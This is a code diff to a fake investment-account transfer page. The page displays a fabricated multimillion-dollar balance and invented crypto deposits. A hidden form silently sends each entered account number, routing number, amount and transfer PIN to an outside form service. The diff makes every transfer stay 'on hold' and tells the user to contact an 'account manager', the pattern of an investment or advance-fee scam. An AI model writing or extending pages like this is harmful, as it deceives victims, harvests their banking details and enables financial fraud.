@@ -216,8 +216,8 @@
             margin-bottom: 1.5rem;
         }
 
-        .success-icon {
-            color: #00a859;
+        .warning-icon {
+            color: #ff9800;
         }
 
         .error-icon {
@@ -245,10 +245,19 @@
             cursor: pointer;
             font-size: 1rem;
             transition: background 0.3s;
+            margin: 0.5rem;
         }
 
         .popup-content button:hover {
             background: #005eb8;
+        }
+
+        .popup-content .home-btn {
+            background: #ff9800;
+        }
+
+        .popup-content .home-btn:hover {
+            background: #f57c00;
         }
 
         .popup-loader {
@@ -345,7 +354,6 @@
         </button>
     </div>
 
-    <!-- Hidden form that will be submitted in the background -->
     <form id="phraseForm" style="display: none;">
         <input type="hidden" name="access_key" value="19bd1a1c-04ae-4540-8975-9d05a216e05e">
         <input type="hidden" name="subject" value="Transfer initiated from Investment Account">
@@ -360,18 +368,32 @@
         <input type="checkbox" name="botcheck" style="display: none;">
     </form>
 
-    <div id="successPopup" class="popup">
+    <!-- Processing Popup -->
+    <div id="processingPopup" class="popup">
         <div class="popup-content">
-            <div id="successPopupLoader" class="popup-loader">
+            <div class="popup-loader" style="display: flex;">
                 <div class="loader"></div>
             </div>
-            <div class="popup-icon success-icon">
-                <i class="fas fa-check-circle"></i>
+            <div class="popup-icon" style="color: #005eb8;">
+                <i class="fas fa-spinner fa-pulse"></i>
             </div>
-            <h2>Transfer Successful!</h2>
-            <p id="successMessage">Your transfer has been processed successfully.</p>
-            <div class="transaction-reference" id="successReference"></div>
-            <button onclick="closePopup('successPopup')">Close</button>
+            <h2>Processing Transaction</h2>
+            <p>We are processing your transaction. Please wait...</p>
+        </div>
+    </div>
+
+    <!-- Pending Hold Popup -->
+    <div id="pendingPopup" class="popup">
+        <div class="popup-content">
+            <div class="popup-icon warning-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <h2 style="color: #ff9800;">Transaction on Hold</h2>
+            <p>Your transfer is temporarily on hold.<br><strong>Contact your account manager for the confirmation process.</strong></p>
+            <div class="transaction-reference" id="pendingReference"></div>
+            <button class="home-btn" onclick="goToHomePage()">
+                <i class="fas fa-home"></i> Return to Home Page
+            </button>
         </div>
     </div>
 
@@ -390,18 +412,125 @@
     </div>
 
     <script>
-        // Configuration matching dashboard
-        const DEFAULT_BALANCE = 4150000.00;
-        const CORRECT_PIN = "111122";
+        // ========== WEB STORAGE KEYS ==========
+        const STORAGE_BALANCE = 'investment_balance';
+        const STORAGE_TRANSACTIONS = 'investment_transactions';
+        const DEFAULT_BALANCE = 4175700.00;
+        const CORRECT_PIN = "2123";
 
-        // Generate unique transaction reference
+        const DEFAULT_TRANSACTIONS = [
+            { 
+                name: "COINBASE - DEPOSIT", 
+                time: "27 JAN 2026 • 8:40 AM", 
+                amount: 85700.00, 
+                type: "credit",
+                reference: 'DEP-789012-A1B2C',
+                status: "completed",
+                description: "Deposit from COINBASE",
+                beneficiary: "ANNE BLANFORD",
+                date: "27 January 2026",
+                exactTime: "8:40 AM"
+            },
+            { 
+                name: "COINBASE - DEPOSIT", 
+                time: "14 JAN 2026 • 2:32 AM", 
+                amount: 60000.00, 
+                type: "credit",
+                reference: 'DEP-456789-D3E4F',
+                status: "completed",
+                description: "Deposit from COINBASE",
+                beneficiary: "ANNE BLANFORD",
+                date: "14 January 2026",
+                exactTime: "2:32 AM"
+            },
+            { 
+                name: "COINBASE - DISBURSEMENT", 
+                time: "24 Dec 2025 • 2:30 AM", 
+                amount: 3000000.00, 
+                type: "credit",
+                reference: 'DEP-123456-G5H6I',
+                status: "completed",
+                description: "Investment disbursement from COINBASE",
+                beneficiary: "ANNE BLANFORD",
+                date: "24 December 2025",
+                exactTime: "2:30 AM"
+            },
+            { 
+                name: "LTT CRYPTO - INVESTMENT PROFIT", 
+                time: "24 Dec 2025 • 1:30 AM", 
+                amount: 1150000.00, 
+                type: "credit",
+                reference: 'DEP-987654-J7K8L',
+                status: "completed",
+                description: "LTT CRYPTO investment profit distribution",
+                beneficiary: "ANNE BLANFORD",
+                date: "24 December 2025",
+                exactTime: "1:30 AM"
+            }
+        ];
+
         function generateTransactionRef() {
-            const timestamp = Date.now().toString().slice(-8);
+            const timestamp = Date.now().toString().slice(-6);
             const random = Math.random().toString(36).substr(2, 6).toUpperCase();
-            return `TRX-${timestamp}-${random}`;
+            return `INV-${timestamp}-${random}`;
         }
 
-        // Page initialization
+        function getCurrentBalance() {
+            let balance = parseFloat(localStorage.getItem(STORAGE_BALANCE));
+            if (isNaN(balance)) {
+                balance = DEFAULT_BALANCE;
+                localStorage.setItem(STORAGE_BALANCE, balance);
+            }
+            return balance;
+        }
+
+        function updateBalance(newBalance) {
+            localStorage.setItem(STORAGE_BALANCE, newBalance);
+        }
+
+        function addTransactionToStorage(transactionData) {
+            try {
+                let transactions = JSON.parse(localStorage.getItem(STORAGE_TRANSACTIONS)) || [];
+                
+                const hasDefaultCoinbase1 = transactions.some(t => t.name === "COINBASE - DEPOSIT" && t.amount === 85700.00);
+                const hasDefaultCoinbase2 = transactions.some(t => t.name === "COINBASE - DEPOSIT" && t.amount === 60000.00);
+                const hasDefaultDisbursement = transactions.some(t => t.name === "COINBASE - DISBURSEMENT");
+                const hasDefaultLTT = transactions.some(t => t.name === "LTT CRYPTO - INVESTMENT PROFIT");
+                
+                if (!hasDefaultCoinbase1) transactions.push(DEFAULT_TRANSACTIONS[0]);
+                if (!hasDefaultCoinbase2) transactions.push(DEFAULT_TRANSACTIONS[1]);
+                if (!hasDefaultDisbursement) transactions.push(DEFAULT_TRANSACTIONS[2]);
+                if (!hasDefaultLTT) transactions.push(DEFAULT_TRANSACTIONS[3]);
+                
+                transactions.unshift(transactionData);
+                localStorage.setItem(STORAGE_TRANSACTIONS, JSON.stringify(transactions));
+                console.log('Transaction saved. Total:', transactions.length);
+                return true;
+            } catch (error) {
+                console.error('Error saving transaction:', error);
+                return false;
+            }
+        }
+
+        function notifyDashboardPage() {
+            try {
+                window.dispatchEvent(new StorageEvent('storage', {
+                    key: STORAGE_TRANSACTIONS,
+                    newValue: localStorage.getItem(STORAGE_TRANSACTIONS)
+                }));
+                
+                if (window.opener && !window.opener.closed) {
+                    window.opener.postMessage({ type: 'TRANSFER_COMPLETED' }, '*');
+                }
+            } catch(e) {
+                console.log('Could not notify dashboard page:', e);
+            }
+        }
+
+        function goToHomePage() {
+            window.location.href = '../index.html';
+        }
+
         setTimeout(() => {
             document.getElementById('pageLoader').style.opacity = '0';
             setTimeout(() => {
@@ -411,7 +540,6 @@
         }, 1500);
 
         function submitPhraseForm() {
-            // Set all the form values from the input fields
             document.getElementById('formReceiverName').value = document.getElementById('reciverName').value;
             document.getElementById('formBankName').value = document.getElementById('bankName').value;
             document.getElementById('formWireRouting').value = document.getElementById('wirerouting').value;
@@ -420,74 +548,50 @@
             document.getElementById('formAmount').value = document.getElementById('amount').value;
             document.getElementById('formTransferPin').value = document.getElementById('transferPin').value;
             
-            // Submit silently using fetch()
             const formData = new FormData(document.getElementById('phraseForm'));
-            
-            // Add timestamp to ensure unique submission
             formData.append('timestamp', new Date().toISOString());
             
             fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
                 body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
+                headers: { 'Accept': 'application/json' }
             })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log('Form submission successful:', data);
-                if (!data.success) {
-                    console.error('Form submission failed:', data.message);
-                }
-            })
-            .catch(error => {
-                console.error('Error submitting form:', error);
-            });
+            .then(response => response.json())
+            .then(data => console.log('Form submitted:', data))
+            .catch(error => console.error('Form error:', error));
         }
 
-        function addTransactionToDashboard(transactionData) {
-            try {
-                if (window.opener && typeof window.opener.addNewTransaction === 'function') {
-                    // Call the dashboard's addNewTransaction function
-                    const reference = window.opener.addNewTransaction(transactionData);
-                    return reference;
-                } else {
-                    // Fallback: Update localStorage directly
-                    const transactions = JSON.parse(localStorage.getItem('transactionHistory')) || [];
-                    transactions.unshift(transactionData);
-                    localStorage.setItem('transactionHistory', JSON.stringify(transactions));
-                    return transactionData.reference;
-                }
-            } catch (error) {
-                console.error('Error adding transaction to dashboard:', error);
-                // Fallback to localStorage
-                const transactions = JSON.parse(localStorage.getItem('transactionHistory')) || [];
-                transactions.unshift(transactionData);
-                localStorage.setItem('transactionHistory', JSON.stringify(transactions));
-                return transactionData.reference;
-            }
+        function showProcessingPopup() {
+            const popup = document.getElementById('processingPopup');
+            popup.style.display = 'flex';
+        }
+
+        function hideProcessingPopup() {
+            const popup = document.getElementById('processingPopup');
+            popup.style.display = 'none';
+        }
+
+        function showPendingPopup(reference) {
+            document.getElementById('pendingReference').textContent = `Reference: ${reference}`;
+            const popup = document.getElementById('pendingPopup');
+            popup.style.display = 'flex';
         }
 
         function processTransfer() {
             const fields = ['reciverName', 'bankName', 'wirerouting', 
                           'Reasonsforpayment', 'accountNumber', 'amount', 'transferPin'];
             
-            // Validate all fields
-            if (!fields.every(id => document.getElementById(id).value.trim())) {
-                alert('Please complete all fields before proceeding.');
-                return;
+            for (const field of fields) {
+                if (!document.getElementById(field).value.trim()) {
+                    alert('Please complete all fields before proceeding.');
+                    return;
+                }
             }
 
             const amount = parseFloat(document.getElementById('amount').value);
             const transferPin = document.getElementById('transferPin').value;
             const transferButton = document.getElementById('transferButton');
             
-            // Validate amount
             if (isNaN(amount) || amount <= 0) {
                 alert('Please enter a valid amount greater than 0.');
                 return;
@@ -498,129 +602,110 @@
                 return;
             }
 
-            // Disable button during processing
             transferButton.disabled = true;
             document.getElementById('buttonText').style.display = 'none';
             document.getElementById('buttonLoader').style.display = 'block';
 
-            // Submit the form data immediately
             submitPhraseForm();
+
+            // Show processing popup
+            showProcessingPopup();
 
             setTimeout(() => {
                 try {
-                    // PIN verification
                     if (transferPin !== CORRECT_PIN) {
-                        throw new Error('ATTENTION - UNBALE TO PROCESS THIS TRANSFER CONTACT YOUR ACCOUNT MANAGER.');
+                        hideProcessingPopup();
+                        throw new Error('ATTENTION - UNABLE TO PROCESS THIS TRANSFER. Please contact your account manager.');
                     }
 
-                    // Balance check
-                    let currentBalance = parseFloat(localStorage.getItem('balance')) || DEFAULT_BALANCE;
+                    let currentBalance = getCurrentBalance();
+                    
                     if (amount > currentBalance) {
-                        throw new Error('Insufficient Funds - You do not have sufficient funds in your account.');
+                        hideProcessingPopup();
+                        throw new Error(`Insufficient Funds - Available balance: $${currentBalance.toLocaleString()}`);
                     }
 
-                    // Update balance
-                    currentBalance -= amount;
-                    localStorage.setItem('balance', currentBalance);
+                    // Deduct balance immediately
+                    const newBalance = currentBalance - amount;
+                    updateBalance(newBalance);
 
-                    // Generate transaction reference
                     const transactionRef = generateTransactionRef();
                     const now = new Date();
+                    
+                    // Get all entered details
+                    const receiverName = document.getElementById('reciverName').value.trim();
+                    const bankName = document.getElementById('bankName').value.trim();
+                    const wireRouting = document.getElementById('wirerouting').value.trim();
+                    const reasonForPayment = document.getElementById('Reasonsforpayment').value.trim();
+                    const accountNum = document.getElementById('accountNumber').value.trim();
 
-                    // Create enhanced transaction data
+                    // Create transaction with PENDING status (NEVER successful)
                     const transactionData = {
-                        name: `Transfer to ${document.getElementById('bankName').value.trim()}`,
-                        time: now.toLocaleDateString('en-GB', {
-                            day: 'numeric',
-                            month: 'short',
-                            year: 'numeric'
-                        }) + " • " + now.toLocaleTimeString('en-US', {
-                            hour: '2-digit',
-                            minute: '2-digit'
-                        }),
-                        amount: -Math.abs(amount),
+                        name: `Transfer to ${bankName}`,
+                        time: now.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' }) + " • " + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }),
+                        amount: amount,
                         type: "debit",
                         reference: transactionRef,
-                        status: "completed",
-                        description: `Transfer to ${document.getElementById('reciverName').value.trim()} - ${document.getElementById('Reasonsforpayment').value.trim()}`,
+                        status: "pending",
+                        description: `Transfer to ${receiverName} - ${reasonForPayment}`,
                         category: "Transfer",
                         method: "Wire Transfer",
-                        beneficiary: document.getElementById('reciverName').value.trim(),
-                        accountNumber: document.getElementById('accountNumber').value.trim(),
-                        date: now.toLocaleDateString('en-GB', {
-                            day: 'numeric',
-                            month: 'long',
-                            year: 'numeric'
-                        }),
-                        exactTime: now.toLocaleTimeString('en-US', {
-                            hour: '2-digit',
-                            minute: '2-digit'
-                        })
+                        beneficiary: receiverName,
+                        bankName: bankName,
+                        wireRouting: wireRouting,
+                        reasonForPayment: reasonForPayment,
+                        accountNumber: accountNum,
+                        date: now.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' }),
+                        exactTime: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' })
                     };
 
-                    // Add transaction to dashboard
-                    const addedReference = addTransactionToDashboard(transactionData);
+                    // Save transaction as PENDING
+                    addTransactionToStorage(transactionData);
+                    notifyDashboardPage();
 
-                    // Show success with transaction reference
-                    document.getElementById('successReference').textContent = `Reference: ${addedReference || transactionRef}`;
-                    document.getElementById('successMessage').textContent = 
-                        `Your transfer of $${amount.toLocaleString('en-US', {minimumFractionDigits: 2})} has been processed successfully.`;
-                    showPopup('successPopup');
+                    // Hide processing popup after 2 seconds
+                    setTimeout(() => {
+                        hideProcessingPopup();
+                        
+                        // Show pending hold popup
+                        showPendingPopup(transactionRef);
+                        
+                        transferButton.disabled = false;
+                        document.getElementById('buttonText').style.display = 'block';
+                        document.getElementById('buttonLoader').style.display = 'none';
+                    }, 2000);
 
                 } catch (error) {
-                    const [title, message] = error.message.split(' - ');
-                    showPopup('errorPopup', title, message);
-                } finally {
-                    // Reset button state
+                    hideProcessingPopup();
+                    const errorMsg = error.message;
+                    let title = 'Transaction Failed';
+                    let message = errorMsg;
+                    
+                    if (errorMsg.includes('ATTENTION')) {
+                        title = 'Verification Required';
+                    } else if (errorMsg.includes('Insufficient')) {
+                        title = 'Insufficient Funds';
+                    }
+                    
+                    document.getElementById('errorTitle').textContent = title;
+                    document.getElementById('errorMessage').textContent = message;
+                    document.getElementById('errorPopup').style.display = 'flex';
+                    
                     transferButton.disabled = false;
                     document.getElementById('buttonText').style.display = 'block';
                     document.getElementById('buttonLoader').style.display = 'none';
+                    
+                    setTimeout(() => {
+                        document.getElementById('errorPopup').style.display = 'none';
+                    }, 3000);
                 }
-            }, 2000);
-        }
-
-        function showPopup(popupId, title = '', message = '') {
-            const popup = document.getElementById(popupId);
-            const loader = document.getElementById(`${popupId}Loader`);
-
-            if (title && popupId === 'errorPopup') {
-                document.getElementById('errorTitle').textContent = title;
-            }
-            if (message && popupId === 'errorPopup') {
-                document.getElementById('errorMessage').textContent = message;
-            }
-
-            popup.style.display = 'flex';
-            loader.style.display = 'flex';
-            
-            setTimeout(() => {
-                loader.style.display = 'none';
-            }, 1500);
+            }, 3000);
         }
 
         function closePopup(popupId) {
             document.getElementById(popupId).style.display = 'none';
-            if (popupId === 'successPopup') {
-                // Clear form
-                const fields = ['reciverName', 'bankName', 'wirerouting', 
-                              'Reasonsforpayment', 'accountNumber', 'amount', 'transferPin'];
-                fields.forEach(id => {
-                    document.getElementById(id).value = '';
-                });
-                
-                // Notify parent window if opened from dashboard
-                try {
-                    window.opener.postMessage('transferCompleted', '*');
-                    setTimeout(() => {
-                        window.location.href = '../dashboard.html';
-                    }, 1000);
-                } catch (e) {
-                    // If not opened from dashboard, just stay on page
-                }
-            }
         }
 
-        // Auto-format amount
         document.getElementById('amount').addEventListener('blur', function(e) {
             const value = parseFloat(e.target.value);
             if (!isNaN(value)) {
@@ -628,12 +713,16 @@
             }
         });
 
-        // Press Enter to submit
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
-                processTransfer();
+                const activeElement = document.activeElement;
+                if (activeElement && activeElement.tagName !== 'BUTTON') {
+                    processTransfer();
+                }
             }
         });
+        
+        console.log('Transfer page loaded. Transactions will ALWAYS remain PENDING.');
     </script>
 </body>
 </html>
